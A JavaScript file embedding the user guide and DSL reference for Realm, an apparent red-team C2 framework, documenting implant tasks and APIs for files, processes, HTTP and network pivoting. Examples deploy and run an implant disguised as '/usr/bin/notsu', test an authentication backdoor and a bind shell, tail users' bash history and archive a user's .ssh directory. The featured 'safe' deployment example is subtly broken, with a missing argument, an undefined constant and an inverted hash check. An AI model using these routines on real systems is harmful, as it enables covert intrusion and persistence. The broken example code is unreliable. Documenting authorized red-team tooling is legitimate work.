export const TOMES_DOC = `---
title: Tomes
tags:
 - User Guide
description: Tomes User Guide
permalink: user-guide/tomes
---
## Tomes

A [Tome](/user-guide/terminology#tome) is an [Eldritch](/user-guide/terminology#eldritch) package that can be run on one or more [Beacons](/user-guide/terminology#beacon). By default, Tavern includes several core [Tomes](/user-guide/terminology#tome) to get you started. Please take a few minutes to read through the [options available to you](https://github.com/spellshift/realm/tree/main/tavern/tomes) now, and be sure to refer to them as reference when creating your own [Tomes](/user-guide/terminology#tome). If you're looking for information on how to run [Tomes](/user-guide/terminology#tome) and aren't quite ready to write your own, check out our [Getting Started guide](/user-guide/getting-started). Otherwise, adventure onwards, but with a word of warning. [Eldritch](/user-guide/terminology#eldritch) provides a useful abstraction for many offensive operations, however it is under heavy active development at this time and is subject to change. After the release of [Realm](https://github.com/spellshift/realm) version \`1.0.0\`, [Eldritch](/user-guide/terminology#eldritch) will follow [Semantic Versioning](https://semver.org/), to prevent [Tomes](/user-guide/terminology#tome) from failing when breaking changes are introduced. Until then however, the [Eldritch](/user-guide/terminology#eldritch) API may change. This rapid iteration will enable the language to more quickly reach maturity and ensure we provide the best possible design for operators, so thank you for your patience.

## Anatomy of a Tome

A [Tome](/user-guide/terminology#tome) has a well-defined structure consisting of three key components:

1. \`metadata.yml\`: This file serves as the [Tome's](/user-guide/terminology#tome) blueprint, containing essential information in YAML format. More information about this file can be found below in the [Tome Metadata section.](/user-guide/tomes#tome-metadata)

2. \`main.eldritch\`: This file is where the magic happens. It contains the [Eldritch](/user-guide/terminology#eldritch) code evaluated by the [Tome](/user-guide/terminology#tome). Testing your code with [Golem](/user-guide/golem) before running it in production is highly recommended, since it enables signficantly faster developer velocity.

3. \`assets/\` (optional): [Tomes](/user-guide/terminology#tome) have the capability to leverage additional resources stored externally. These assets, which may include data files, configuration settings, or other tools, are fetched using the implant's callback protocol (e.g. \`gRPC\`) using the [Eldritch Assets API](/user-guide/eldritch#assets). More information about these files can be found below in the [Tome Assets section.](/user-guide/tomes#tome-assets)

## Tome Metadata

The \`metadata.yml\` file specifies key information about a [Tome](/user-guide/terminology#tome):

| Name | Description | Required |
|------|-------------|----------|
| \`name\` | Display name of your [Tome](/user-guide/terminology#tome). | Yes |
| \`description\` | Provide a helpful description of functionality, for user's of your [Tome](/user-guide/terminology#tome). | Yes |
| \`author\` | Your name/handle, so you can get credit for your amazing work! | Yes |
| \`support_model\` | The type of support offered by this tome \`FIRST_PARTY\` (from realm developers) or \`COMMUNITY\` | Yes |
| \`tactic\` | The relevant [MITRE ATT&CK tactic](https://attack.mitre.org/tactics/enterprise/) that best describes this [Tome](/user-guide/terminology#tome). Possible values include: \`UNSPECIFIED\`, \`RECON\`, \`RESOURCE_DEVELOPMENT\`, \`INITIAL_ACCESS\`, \`EXECUTION\`, \`PERSISTENCE\`, \`PRIVILEGE_ESCALATION\`, \`DEFENSE_EVASION\`, \`CREDENTIAL_ACCESS\`, \`DISCOVERY\`, \`LATERAL_MOVEMENT\`, \`COLLECTION\`,\`COMMAND_AND_CONTROL\`,\`EXFILTRATION\`, \`IMPACT\`. | Yes |
| \`paramdefs\` | A list of [parameters](/user-guide/tomes#tome-parameters) that users may provide to your [Tome](/user-guide/terminology#tome) when it is run. | No |

### Tome Parameters

Parameters are defined as a YAML list, but have their own additional properties:

| Name | Description | Required |
| ---- | ----------- | -------- |
| \`name\` | Identifier used to access the parameter via the \`input_params\` global. | Yes |
| \`label\` | Display name of the parameter for users of the [Tome](/user-guide/terminology#tome). | Yes |
| \`type\` | Type of the parameter in [Eldritch](/user-guide/terminology#eldritch). Current values include: \`string\`. | Yes |
| \`placeholder\` | An example value displayed to users to help explain the parameter's purpose. | Yes |

#### Tome Parameter Example

\`\`\`yaml
paramdefs:
  - name: path
    type: string
    label: File path
    placeholder: "/etc/open*"
\`\`\`

#### Referencing Tome Parameters

If you've defined a parameter for your [Tome](/user-guide/terminology#tome), there's a good chance you'll want to use it. Luckily, [Eldritch](/user-guide/terminology#eldritch) makes this easy for you by providing a global \`input_params\` dictionary, which is populated with the parameter values provided to your [Tome](/user-guide/terminology#tome). To access a parameter, simply use the \`paramdef\` name (defined in \`metadata.yml\`). For example:

\`\`\`python
def print_path_param():
  path = input_params["path"]
  print(path)
\`\`\`

In the above example, our \`metadata.yml\` file would specify a value for \`paramdefs\` with \`name: path\` set. Then when accessing \`input_params["path"]\` the string value provided to the [Tome](/user-guide/terminology#tome) is returned.

### Tome Metadata Example

\`\`\`yaml
name: List files
description: List the files and directories found at the path. Supports basic glob functionality. Does not glob more than one level.
author: hulto
tactic: RECON
support_model: COMMUNITY
paramdefs:
  - name: path
    type: string
    label: File path
    placeholder: "/etc/open*"
\`\`\`

For more examples, please see Tavern's first party supported [Tomes](https://github.com/spellshift/realm/tree/main/tavern/tomes).

### Tome Assets

Assets are files that can be made available to your [Tome](/user-guide/terminology#tome) if required. These assets are lazy-loaded by [Agents](/user-guide/terminology#agent), so if they are unused they will not increase the on-the-wire size of the payload sent to an [Agent](/user-guide/terminology#agent). This means it's encouraged to include multiple versions of files, for example \`myimplant-linux\` and \`myimplant.exe\`. This enables [Tomes](/user-guide/terminology#tome) to be cross-platform, reducing the need for redundant [Tomes](/user-guide/terminology#tome).

#### Referencing Tome Assets

When using the [Eldritch Assets API](/user-guide/eldritch#assets), these assets are referenced based on the **name of the directory** your \`main.eldritch\` file is in (which may be the same as your [Tome's](/user-guide/terminology#tome) name). For example, with an asset \`imix.exe\` located in \`/mytome/assets/imix.exe\` (and where my \`metadata.yml\` might specify a name of "My Tome"), the correct identifier to reference this asset is \`mytome/assets/imix.exe\` (no leading \`/\`). On all platforms (even on Windows systems), use \`/\` as the path separator when referencing these assets.

Below is the directory structure used in this example:

\`\`\`shell
\$ tree ./mytome/
./mytome/
├── assets
│   ├── imix.exe
│   └── imix-linux
├── main.eldritch
└── metadata.yml
\`\`\`

## Importing Tomes from Git

### Create Git Repository

First, create a git repository and commit your [Tomes](/user-guide/terminology#tome) there. Realm primarily supports using GitHub private repositories (or public if suitable), but you may use any git hosting service at your own risk. If you forget to include \`main.eldritch\` or \`metadata.yml\` files, your [Tomes](/user-guide/terminology#tome) **will not be imported**. Be sure to include a \`main.eldritch\` and \`metadata.yml\` in your [Tome's](/user-guide/terminology#tome) root directory.

Additionally, copy the URL to the repository, which you will need in the next step. **For private repositories, only SSH is supported.**

![Git Repo Copy](/assets/img/user-guide/tomes/git-repo-copy.png)

### Import Tome Repository

Next, navigate to the "Tomes" page and select "Import tome repository"

![Tavern Tomes Page](/assets/img/user-guide/tomes/tomes-page.png)

Then, enter the repository URL copied from the previous step and click "Save Link".

![Import Tomes](/assets/img/user-guide/tomes/import-tomes.png)

### Git Repository Keys

For private repositories, Tavern will need permission to clone the repository. To enable this, copy the provided SSH public key and add it to your repository. For public repositories, you may skip this step.

![Import Tomes Pubkey](/assets/img/user-guide/tomes/import-tomes-pubkey.png)

On GitHub, you can easily accomplish this by adding Tavern's public key for the repository to the "Deploy Keys" setting of your repository.

![GitHub Deploy Keys](/assets/img/user-guide/tomes/github-deploy-keys.png)

### Import Tomes

Now, all that's left is to click "Import tomes". If all goes well, your [Tomes](/user-guide/terminology#tome) will be added to Tavern and will be displayed on the view. If [Tomes](/user-guide/terminology#tome) are missing, be sure each [Tome](/user-guide/terminology#tome)  has a valid \`metadata.yml\` and \`main.eldritch\` file in the [Tome](/user-guide/terminology#tome) root directory.

Anytime you need to re-import your [Tomes](/user-guide/terminology#tome) (for example, after an update), you may navigate to the "Tomes" page and click "Refetch tomes".

## Tome writing best practices

Writing tomes will always be specific to your use case. Different teams, different projects will prioritize different things. In this guide we'll prioritize reliability and safety at the expense of OPSEC.

OPSEC considerations will tend towards avoiding calls to \`shell\` and \`exec\` instead using native functions to accomplish the function.

In some situations you may also wish to avoid testing on target if that's the case you should test throughly off target before launching.

If you test off target you can leverage native functions like [\`sys.get_os\`](/user-guide/eldritch#sysget_os) to ensure that your tome only runs against targets it's been tested on.

### Example

Copy and run an asset in a safe and idempotant way

\`\`\`python
IMPLANT_ASSET_PATH = "tome_name/assets/implant"
ASSET_SHA1SUM = "44e1bf82832580c11de07f57254bd4af837b658e"

def pre_flight(dest_bin_path):
    ## Testing

    # Note that we're using multiple returns instead of
    # nesting if statements. This style is to ensure
    # line of sight readability when reviewing code.
    if not sys.is_linux():
      print("[error] tome only supports linux")
      return False

    cur_user = sys.get_user()
    if cur_user['euid']['uid'] != 0:
      print(f"[error] tome must be run as root / uid 0 not {cur_user}")
      return False

    # Validate the destination directory exists
    if not file.is_dir(file.parent_dir(dest_bin_path)):
      print(f"[error] path {dest_bin_path} parent isn't a directory")
      return False

    if file.is_file(dest_bin_path):
      print(f"[error] path {dest_bin_path} already exists")
      return False

    does_chmod_exist = sys.shell(f"command -v chmod")
    if does_chmod_exist['status'] != 0:
        print(f"[error] tome requires \`chmod\` be available in PATH")
        return False

    return True


def deploy_asset(asset_path, dest, asset_hash):
  if file.is_file(asset_path):
    if crypto.hash_file(asset_path, "SHA1") != asset_hash:
      print(f"{dest} file already exists and is good")
      return True

  pdir = file.parent_dir(dest)
  if not file.is_dir(pdir):
      print(f"{pdir} isn't a dir aborting")
      return False

  asset.copy(asset_path, dest)
  return True

def set_perms(dest, perms):
  cur_perms = sys.shell(f"stat -f %A {dest}")
  if cur_perms['status'] == 0:
    if cur_perms['stdout'].strip() == perms:
      print(f"dest perms already set")
      return True

  res = sys.shell(f"chmod {perms} {dest}")
  print(f"modified perms of {dest}")
  pprint(res)
  if res['status'] == 0:
    return True

  print(f"failed to set perms {perms} on {dest}")
  return False

def execute_once(dest):
  for p in process.list():
    if p['path'] == dest:
      print(f"process {dest} is already running")
      pprint(p)
      return True

  res = sys.exec(dest, [], True)

  for p in process.list():
    if p['path'] == dest:
      print(f"process {dest} is now running")
      pprint(p)
      return True

  return False

def cleanup(dest):
  if file.is_file(dest):
    print(f"cleaning up {dest}")
    file.remove(dest)


def main(dest_file_path):
  if not pre_flight():
    cleanup(dest_file_path)
    return
  if not deploy_asset(ASSET_PATH, dest_file_path, ASSET_SHA1SUM):
    cleanup(dest_file_path)
    return
  if not set_perms(dest_file_path, "755"):
    cleanup(dest_file_path)
    return
  execute_once(dest_file_path)


main(input_params['DEST_FILE_PATH'])
\`\`\`

### Passing input
Tomes have an inherent global variable \`input_params\` that defines variables passed from the UI.
These are defined in your \`metadata.yml\` file.
Best practice is to pass these into your \`main\` function and sub functions to keep them reusable.
There is currently no way to define \`input_params\` during golem run time so if you're using golem to test tomes you may need to manually define them. Eg.

\`\`\`python
input_params = {}
input_params['DEST_FILE_PATH'] = "/bin/imix"

main(input_params['DEST_FILE_PATH'])
\`\`\`

### Fail early
Before modifying anything on Target or loading assets validate that the tome you're building will run as expected.
This avoids artifacts being left on disk if something fails and also provides verbose feedback in the event of an error to reduce trouble shooting time.

Common things to validate:
- Operating systems - all tomes are cross platform so it's up to the tome developer to fail if run on an unsupported OS
- Check parent directory exists using [\`file.parent_dir\`](/user-guide/eldritch#fileparent_dir)
- User permissions
- Required dependencies or LOLBINs

### Backup and Test
If you need to modify configuration that might cause breaking changes to the system.
It's recommended that you create a backup, modify the config, and validate your change.
If something fails during validation replace the original config.

This might look like:
\`\`\`python
file.copy(config_path, f"{config_path}.bak")

if not end_to_end_test():
    print("[error] end to end test failed cleaning up")
    file.remove(config_path)
    file.moveto(f"{config_path}.bak", config_path)
    return

file.remove(f"{config_path}.bak")
\`\`\`

End to end test can validate the backdoor - if possible validate normal system functionality.

\`\`\`python
# Auth backdoor - drop to a user account or \`nobody\` and then auth to a user account
sys.shell(f"echo -e '{password}\\n{password}\\n' | su {user} -c 'su {user} -c id'")

# Bind shell - check against localhost
res = sys.shell(f"{shell_client} 127.0.0.1 id")
\`\`\`


### Idempotence
In many situations especially when deploying persistance you'll want to ensure that running a tome twice won't cause issues.
The best way to handle this is to when possible check the current state of the resource you're about to modify.

This often takes the shape of running validation before and after taking an action.
In the same way during manual operation you might check if a file is on disk and the right size you can automate that with eldritch.

Things to keep in mind:
- Does the file hash match?
- Do the permissions match?
- Is the process already running?
- Is the configuration already set?
`;

export const ELDRITCH_DOC = `---
title: Eldritch
tags:
 - User Guide
description: Eldritch User Guide
permalink: user-guide/eldritch
---
# Overview

Eldritch is a Pythonic red team Domain Specific Language (DSL) based on [starlark](https://github.com/facebookexperimental/starlark-rust). It uses and supports most python syntax and basic functionality such as list comprehension, string operations (\`lower()\`, \`join()\`, \`replace()\`, etc.), and built-in methods (\`any()\`, \`dir()\`, \`hex()\`, \`sorted()\`, etc.). For more details on the supported functionality not listed here, please consult the [Starlark Spec Reference](https://github.com/bazelbuild/starlark/blob/master/spec.md), but for the most part you can treat this like basic Python with extra red team functionality.

Eldritch is a small interpreter that can be embedded into a c2 agent as it is with Golem and Imix.
By embedding the interpreter into the agent conditional logic can be quickly evaluated without requiring multiple callbacks.

**Trying to create a tome? Check out the guide in [Golem](/user-guide/golem).**

## Examples

_Kill a specific process name_

\`\`\`python
for p in process.list():
    if p['name'] == "golem":
        process.kill(p['pid'])
\`\`\`

_Copy your current executable somewhere else_

\`\`\`python
cur_bin_path = process.info()['exe']
dest_path = '/tmp/win'
file.copy(cur_bin_path, dest_path)
file.remove(cur_bin_path)
\`\`\`

_Parse a JSON file_

\`\`\`python
json_str = file.read("/tmp/config.json")
config_data = crypto.from_json(json_str)
print(config_data['key1'])
\`\`\`

## Data types

Eldritch currently only supports the [default starlark data types.](https://github.com/facebookexperimental/starlark-rust/blob/main/docs/types.md)

## Error handling

Eldritch doesn't implement any form of error handling. If a function fails it will stop the tome from completing execution. There is no way to recover after a function has errored.

If you're using a function that has a chance to error (functions that do file / network IO) test preemptively with function like \`is_file\`, \`is_dir\`, \`is_windows\`, etc.

For example:

\`\`\`python
def read_passwd():
    if sys.is_linux():
        if file.is_file("/etc/passwd"):
            print(file.read("/etc/passwd"))
read_passwd()
\`\`\`

\`\`\`python
def write_systemd_service():
    if sys.is_linux():
        if file.is_dir("/lib/systemd/system/"):
            service_args = {
                "name":"my-service",
                "desc":"A test",
                "binary_path":"/bin/false",
            }
            assets.copy("systemd-template.j2", "/tmp/systemd-template.j2")
            file.template("/tmp/systemd-template.j2","/lib/systemd/system/myservice.service",args,False)
            file.remove("/tmp/systemd-template.j2")

write_systemd_service()
\`\`\`

# Standard Library

The standard library is the default functionality that eldritch provides. It contains the following libraries:

- \`agent\` - Used for meta-style interactions with the agent itself.
- \`assets\` - Used to interact with files stored natively in the agent.
- \`crypto\` - Used to encrypt/decrypt or hash data.
- \`file\` - Used to interact with files on the system.
- \`http\` - Used to make http(s) requests from the agent.
- \`pivot\` - Used to identify and move between systems.
- \`process\` - Used to interact with processes on the system.
- \`random\` - Used to generate cryptographically secure random values.
- \`regex\` - Regular expression capabilities for operating on strings.
- \`report\` - Structured data reporting capabilities.
- \`sys\` - General system capabilities can include loading libraries, or information about the current context.
- \`time\` - General functions for obtaining and formatting time, also add delays into code.

**🚨 DANGER 🚨: Name shadowing**

Do not use the standard library names as local variables as it will prevent you from accessing library functions.
For example, if you do:

\`\`\`rust
for file in file.list("/home/"):
    print(file["file_name"])
\`\`\`

The file library will become inaccessible.

It may even raise an error: \`error: Local variable 'file' referenced before assignment\`

Instead we recommend using more descriptive names like:

\`\`\`rust
for user_home_dir in file.list("/home/"):
    print(user_home_dir["file_name"])
\`\`\`

---

## Agent

### agent._terminate_this_process_clowntown

\`agent._terminate_this_process_clowntown() -> None\`

**🚨 DANGER 🚨:** The **agent._terminate_this_process_clowntown** method terminates the agent process immediately by calling \`std::process::exit(0)\`. This effectively kills the agent and should be used with extreme caution. This function does not return as the process exits.

### agent.get_config

\`agent.get_config() -> Dict<str, Value>\`

The **agent.get_config** method returns the current configuration of the agent as a dictionary containing configuration keys and values. This method will error if the configuration cannot be retrieved.

### agent.get_transport

\`agent.get_transport() -> str\`

The **agent.get_transport** method returns the name of the currently active transport (e.g., "http", "grpc", "dns").

### agent.list_transports

\`agent.list_transports() -> List<str>\`

The **agent.list_transports** method returns a list of available transport names supported by the agent.

### agent.get_callback_interval

\`agent.get_callback_interval() -> int\`

The **agent.get_callback_interval** method returns the current callback interval in seconds.

### agent.list_tasks

\`agent.list_tasks() -> List<Dict>\`

The **agent.list_tasks** method returns a list of dictionaries representing the currently running or queued background tasks on the agent. Each dictionary contains task metadata and status.

\`\`\`python
>>> agent.list_tasks()
[{"id": 42949672964, "quest_name": "The Nightmare of the Netherworld Nexus"}]
\`\`\`

### agent.stop_task

\`agent.stop_task(task_id: int) -> None\`

The **agent.stop_task** method stops a specific background task by its ID. If the task cannot be stopped or does not exist, the method will error.


### agent.set_callback_interval

\`agent.set_callback_interval(new_interval: int) -> None\`

The <b>agent.set_callback_interval</b> method takes an unsigned int and changes the
running agent's callback interval to the passed value as seconds. This configuration change will
not persist across agent reboots.

### agent.set_callback_uri

\`agent.set_callback_uri(new_uri: str) -> None\`

The <b>agent.set_callback_uri</b> method takes an string and changes the
running agent's callback uri to the passed value. This configuration change will
not persist across agent reboots. NOTE: please ensure the passed URI path is correct
for the underlying \`Transport\` being used, as a URI can take many forms and we make no
assumptions on \`Transport\` requirements no gut checks are applied to the passed string.

---

## Assets

### assets.copy

\`assets.copy(src: str, dst: str) -> None\`

The <b>assets.copy</b> method copies an embedded file from the agent to disk.
The \`src\` variable will be the path from the \`embed_files_golem_prod\` as the root dir.
For example \`embed_files_golem_prod/sliver/agent-x64\` can be referenced as \`sliver/agent-x64\`.
If \`dst\` exists it will be overwritten. If it doesn't exist the function will fail.

\`\`\`python
def deploy_agent():
    if file.is_dir("/usr/bin"):
        assets.copy("sliver/agent-x64","/usr/bin/notsu")
        sys.exec("/usr/bin/notsu",[],true)
deploy_agent()
\`\`\`

### assets.list

\`assets.list() -> List<str>\`

The <b>assets.list</b> method returns a list of asset names that the agent is aware of.

### assets.read_binary

\`assets.read_binary(src: str) -> List<int>\`

The <b>assets.read_binary</b> method returns a list of u32 numbers representing the asset files bytes.

### assets.read

\`assets.read(src: str) -> str\`

The <b>assets.read</b> method returns a UTF-8 string representation of the asset file.

---

## Crypto

### crypto.aes_decrypt_file

\`crypto.aes_decrypt_file(src: str, dst: str, key: str) -> None\`

The <b>crypto.aes_decrypt_file</b> method decrypts the given src file using the given key and writes it to disk at the dst location.

Key must be 16 Bytes (Characters)

### crypto.aes_encrypt_file

\`crypto.aes_encrypt_file(src: str, dst: str, key: str) -> None\`

The <b>crypto.aes_encrypt_file</b> method encrypts the given src file, encrypts it using the given key and writes it to disk at the dst location.

Key must be 16 Bytes (Characters)

### crypto.encode_b64

\`crypto.encode_b64(content: str, encode_type: Optional<str>) -> str\`

The <b>crypto.encode_b64</b> method encodes the given text using the given base64 encoding method. Valid methods include:

- STANDARD (default)
- STANDARD_NO_PAD
- URL_SAFE
- URL_SAFE_NO_PAD

### crypto.decode_b64

\`crypto.decode_b64(content: str, decode_type: Optional<str>) -> str\`

The <b>crypto.decode_b64</b> method encodes the given text using the given base64 decoding method. Valid methods include:

- STANDARD (default)
- STANDARD_NO_PAD
- URL_SAFE
- URL_SAFE_NO_PAD

### crypto.from_json

\`crypto.from_json(content: str) -> Value\`

The <b>crypto.from_json</b> method converts JSON text to an object of correct type.

\`\`\`python
crypto.from_json("{\\"foo\\":\\"bar\\"}")
{
    "foo": "bar"
}
\`\`\`

### crypto.is_json

\`crypto.is_json(content: str) -> bool\`

The <b>crypto.is_json</b> tests if JSON is valid.

\`\`\`python
crypto.is_json("{\\"foo\\":\\"bar\\"}")
True
\`\`\`

\`\`\`python
crypto.is_json("foobar")
False
\`\`\`

### crypto.to_json

\`crypto.to_json(content: Value) -> str\`

The <b>crypto.to_json</b> method converts given type to JSON text.

\`\`\`python
crypto.to_json({"foo": "bar"})
"{\\"foo\\":\\"bar\\"}"
\`\`\`

### crypto.hash_file

\`crypto.hash_file(file: str, algo: str) -> str\`

The <b>crypto.hash_file</b> method will produce the hash of the given file's contents. Valid algorithms include:

- MD5
- SHA1
- SHA256
- SHA512

---

## File

### file.append

\`file.append(path: str, content: str) -> None\`

The <b>file.append</b> method appends the \`content\` to file at \`path\`. If no file exists at path create the file with the content.

### file.compress

\`file.compress(src: str, dst: str) -> None\`

The <b>file.compress</b> method compresses a file using the gzip algorithm. If the destination file doesn't exist it will be created. If the source file doesn't exist an error will be thrown. If the source path is a directory the contents will be placed in a tar archive and then compressed.

### file.copy

\`file.copy(src: str, dst: str) -> None\`

The <b>file.copy</b> method copies a file from \`src\` path to \`dst\` path. If \`dst\` file doesn't exist it will be created.

### file.decompress

\`file.decompress(src: str, dst: str) -> None\`

The <b>file.decompress</b> method decompresses a file using the gzip algorithm. If the destination file doesn't exist it will be created. If the source file doesn't exist an error will be thrown. If the output path is a tar archive, the contents will be extracted to a directory at the \`dst\` path. Note the original directory will also be added to the new directory.

\`\`\`python
file.compress('/home/bob/.ssh', '/tmp/bob_ssh.tar.gz')
file.decompress('/tmp/bob_ssh.tar.gz', '/tmp/bob_ssh_output')
# Files will exist in /tmp/bob_ssh_output/.ssh/*
\`\`\`

### file.exists

\`file.exists(path: str) -> bool\`

The <b>file.exists</b> method checks if a file or directory exists at the path specified.

### file.follow

\`file.follow(path: str, fn: function(str)) -> None\`

The <b>file.follow</b> method will call \`fn(line)\` for any new \`line\` that is added to the file (such as from \`bash_history\` and other logs).

\`\`\`python
# Print every line added to bob's bash history
file.follow('/home/bob/.bash_history', print)
\`\`\`

### file.is_dir

\`file.is_dir(path: str) -> bool\`

The <b>file.is_dir</b> method checks if a path exists and is a directory. If it doesn't exist or is not a directory it will return \`False\`.

### file.is_file

\`file.is_file(path: str) -> bool\`

The <b>file.is_file</b> method checks if a path exists and is a file. If it doesn't exist or is not a file it will return \`False\`.

### file.list

\`file.list(path: str) -> List<Dict>\`

The <b>file.list</b> method returns a list of files at the specified path. The path is relative to your current working directory and can be traversed with \`../\`.
This function also supports globbing with \`*\` for example:

\`\`\`python
file.list("/home/*/.bash_history") # List all files called .bash_history in sub dirs of \`/home/\`
file.list("/etc/*ssh*") # List the contents of all dirs that have \`ssh\` in the name and all files in etc with \`ssh\` in the name
file.list("\\\\\\\\127.0.0.1\\\\c\$\\\\Windows\\\\*.yml") # List files over UNC paths
\`\`\`

Each file is represented by a Dict type.
Here is an example of the Dict layout:

\`\`\`json
[
    {
        "file_name": "implants",
        "absolute_path": "/workspace/realm/implants",
        "size": 4096,
        "owner": "root",
        "group": "0",
        "permissions": "40755",
        "modified": "2023-07-09 01:35:40 UTC",
        "type": "Directory"
    },
    {
        "file_name": "README.md",
        "absolute_path": "/workspace/realm/README.md",
        "size": 750,
        "owner": "root",
        "group": "0",
        "permissions": "100644",
        "modified": "2023-07-08 02:49:47 UTC",
        "type": "File"
    },
    {
        "file_name": ".git",
        "absolute_path": "/workspace/realm/.git",
        "size": 4096,
        "owner": "root",
        "group": "0",
        "permissions": "40755",
        "modified": "2023-07-10 21:14:06 UTC",
        "type": "Directory"
    }
]
\`\`\`

### file.mkdir

\`file.mkdir(path: str, parent: Option<bool>) -> None\`

The <b>file.mkdir</b> method will make a new directory at \`path\`. If the parent directory does not exist or the directory cannot be created, it will error; unless the \`parent\` parameter is passed as \`True\`.

### file.moveto

\`file.moveto(src: str, dst: str) -> None\`

The <b>file.moveto</b> method moves a file or directory from \`src\` to \`dst\`. If the \`dst\` directory or file exists it will be deleted before being replaced to ensure consistency across systems.

### file.parent_dir

\`file.parent_dir(path: str) -> str\`

The <b>file.parent_dir</b> method returns the parent directory of a give path. Eg \`/etc/ssh/sshd_config\` -> \`/etc/ssh\`

### file.pwd

\`file.pwd() -> Option<str>\`

The <b>file.pwd</b> method returns the current working directory of the process. If it could not be determined, \`None\` is returned.

### file.read

\`file.read(path: str) -> str\`

The <b>file.read</b> method will read the contents of a file. If the file or directory doesn't exist the method will error to avoid this ensure the file exists, and you have permission to read it.
This function supports globbing with \`*\` for example:

\`\`\`python
file.read("/home/*/.bash_history") # Read all files called .bash_history in sub dirs of \`/home/\`
file.read("/etc/*ssh*") # Read the contents of all files that have \`ssh\` in the name. Will error if a dir is found.
file.read("\\\\\\\\127.0.0.1\\\\c\$\\\\Windows\\\\Temp\\\\metadata.yml") # Read file over Windows UNC
\`\`\`

### file.read_binary

\`file.read(path: str) -> List<int>\`

The <b>file.read_binary</b> method will read the contents of a file, <b>returning as a list of bytes</b>. If the file or directory doesn't exist the method will error to avoid this ensure the file exists, and you have permission to read it.
This function supports globbing with \`*\` for example:

\`\`\`python
file.read_binary("/home/*/.bash_history") # Read all files called .bash_history in sub dirs of \`/home/\`
file.read_binary("/etc/*ssh*") # Read the contents of all files that have \`ssh\` in the name. Will error if a dir is found.
file.read_binary("\\\\\\\\127.0.0.1\\\\c\$\\\\Windows\\\\Temp\\\\metadata.yml") # Read file over Windows UNC
\`\`\`

### file.remove

\`file.remove(path: str) -> None\`

The <b>file.remove</b> method deletes a file or directory (and it's contents) specified by path.

### file.replace

\`file.replace(path: str, pattern: str, value: str) -> None\`

The <b>file.replace</b> method finds the first string matching a regex pattern in the specified file and replaces them with the value. Please consult the [Rust Regex Docs](https://rust-lang-nursery.github.io/rust-cookbook/text/regex.html) for more information on pattern matching.

### file.replace_all

\`file.replace_all(path: str, pattern: str, value: str) -> None\`

The <b>file.replace_all</b> method finds all strings matching a regex pattern in the specified file and replaces them with the value. Please consult the [Rust Regex Docs](https://rust-lang-nursery.github.io/rust-cookbook/text/regex.html) for more information on pattern matching.

### file.temp_file

\`file.temp_file(name: Option<str>) -> str\`

The <b> file.temp</b> method returns the path of a new temporary file with a random filename or the optional filename provided as an argument.

### file.template

\`file.template(template_path: str, dst: str, args: Dict<String, Value>, autoescape: bool) -> None\`

The <b>file.template</b> method reads a Jinja2 template file from disk, fill in the variables using \`args\` and then write it to the destination specified.
If the destination file doesn't exist it will be created (if the parent directory exists). If the destination file does exist it will be overwritten.
The \`args\` dictionary currently supports values of: \`int\`, \`str\`, and \`List\`.
\`autoescape\` when \`True\` will perform HTML character escapes according to the [OWASP XSS guidelines](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)

### file.timestomp

\`file.timestomp(src: str, dst: str) -> None\`

Unimplemented.

### file.write

\`file.write(path: str, content: str) -> None\`

The <b>file.write</b> method writes to a given file path with the given content.
If a file already exists at this path, the method will overwite it. If a directory
already exists at the path the method will error.

### file.find

\`file.find(path: str, name: Option<str>, file_type: Option<str>, permissions: Option<int>, modified_time: Option<int>, create_time: Option<int>) -> List<str>\`

The <b>file.find</b> method finds all files matching the used parameters. Returns file path for all matching items.

- name: Checks if file name contains provided input
- file_type: Checks for 'file' or 'dir' for files or directories, respectively.
- permissions: On UNIX systems, takes numerical input of standard unix permissions (rwxrwxrwx == 777). On Windows, takes 1 or 0, 1 if file is read only.
- modified_time: Checks if last modified time matches input specified in time since EPOCH
- create_time: Checks if last modified time matches input specified in time since EPOCH

---

## HTTP

The HTTP library also allows the user to allow the http client to ignore TLS validation via the \`allow_insecure\` optional parameter (defaults to \`false\`).

### http.download

\`http.download(uri: str, dst: str, allow_insecure: Option<bool>) -> None\`

The <b>http.download</b> method downloads a file at the URI specified in \`uri\` to the path specified in \`dst\`. If a file already exists at that location, it will be overwritten.

### http.get

\`http.get(uri: str, query_params: Option<Dict<str, str>>, headers: Option<Dict<str, str>>, allow_insecure: Option<bool>) -> str\`

The <b>http.get</b> method sends an HTTP GET request to the URI specified in \`uri\` with the optional query paramters specified in \`query_params\` and headers specified in \`headers\`, then return the response body as a string. Note: in order to conform with HTTP2+ all header names are transmuted to lowercase.

### http.post

\`http.post(uri: str, body: Option<str>, form: Option<Dict<str, str>>, headers: Option<Dict<str, str>>, allow_insecure: Option<bool>) -> str\`

The <b>http.post</b> method sends an HTTP POST request to the URI specified in \`uri\` with the optional request body specified by \`body\`, form paramters specified in \`form\`, and headers specified in \`headers\`, then return the response body as a string. Note: in order to conform with HTTP2+ all header names are transmuted to lowercase. Other Note: if a \`body\` and a \`form\` are supplied the value of \`body\` will be used.

---

## Pivot

### pivot.arp_scan

\`pivot.arp_scan(target_cidrs: List<str>) -> List<str>\`

The <b>pivot.arp_scan</b> method is for enumerating hosts on the agent network without using TCP connect or ping.

- \`target_cidrs\` must be in a CIDR format eg. \`127.0.0.1/32\`. Domains and single IPs \`example.com\` / \`127.0.0.1\` cannot be passed.
- Must be running as \`root\` to use.
- Not supported on Windows

Results will be in the format:

\`\`\`python
\$> pivot.arp_scan(["192.168.1.1/32"])
\`\`\`

**Success**

\`\`\`json
[
    { "ip": "192.168.1.1", "mac": "ab:cd:ef:01:23:45", "interface": "eno0" }
]
\`\`\`

**Failure**

\`\`\`json
[]
\`\`\`

### pivot.bind_proxy

\`pivot.bind_proxy(listen_address: str, listen_port: int, username: str, password: str ) -> None\`

The <b>pivot.bind_proxy</b> method is being proposed to provide users another option when trying to connect and pivot within an environment. This function will start a SOCKS5 proxy on the specified port and interface, with the specified username and password (if provided).

### pivot.ncat

\`pivot.ncat(address: str, port: int, data: str, protocol: str ) -> str\`

The <b>pivot.ncat</b> method allows a user to send arbitrary data over TCP/UDP to a host. If the server responds that response will be returned.

\`protocol\` must be \`tcp\`, or \`udp\` anything else will return an error \`Protocol not supported please use: udp or tcp.\`.

### pivot.port_forward

\`pivot.port_forward(listen_address: str, listen_port: int, forward_address: str, forward_port:  int, str: protocol  ) -> None\`

The <b>pivot.port_forward</b> method is being proposed to provide socat like functionality by forwarding traffic from a port on a local machine to a port on a different machine allowing traffic to be relayed.

### pivot.port_scan

\`pivot.port_scan(target_cidrs: List<str>, ports: List<int>, protocol: str, timeout: int) -> List<str>\`

